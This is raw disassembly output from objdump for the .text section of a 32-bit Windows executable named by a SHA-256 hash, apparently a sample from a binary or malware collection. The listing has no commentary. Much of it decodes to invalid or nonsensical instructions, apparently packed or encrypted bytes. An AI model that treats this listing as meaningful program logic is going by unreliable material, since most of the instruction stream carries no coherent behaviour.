
e7edadcfaf822fea4f2a2fa112fb63d4156151314ee82ebb574adaec7811ed37.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
